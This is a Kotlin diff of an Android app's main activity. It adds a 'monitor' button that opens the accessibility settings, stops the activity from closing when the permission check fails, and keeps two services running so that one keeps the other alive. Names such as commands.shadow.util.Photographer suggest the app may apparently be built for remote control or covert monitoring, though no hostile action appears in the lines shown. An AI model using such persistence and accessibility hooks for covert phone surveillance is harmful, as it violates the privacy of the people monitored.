@@ -3,18 +3,19 @@ package com.hc.calling
 import android.Manifest
 import android.content.Intent
 import android.os.Bundle
+import android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS
 import android.support.v7.app.AppCompatActivity
-import com.hc.calling.callingtransaction.R
 import com.hc.calling.commands.shadow.util.Photographer
 import com.hc.calling.util.DensityUtil
 import com.hc.calling.util.PermissonUtil
+import kotlinx.android.synthetic.main.activity_main.*
 
 
 class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
+        setContentView(com.hc.calling.callingtransaction.R.layout.activity_main)
         //start two services for keep the mainly service alive
         val intent = Intent(this, MainService::class.java)
         val intent2 = Intent(this, KeeperService::class.java)
@@ -42,10 +43,20 @@ class MainActivity : AppCompatActivity() {
                 10000
             )
         ) {
-            finish()
+//            finish()
         }
 
 
+        tv_btn_monitor.setOnClickListener {
+            jump2Setting()
+        }
+
+
+    }
+
+    private fun jump2Setting() {
+        val intent = Intent(ACTION_ACCESSIBILITY_SETTINGS)
+        startActivity(intent)
     }
 
 }
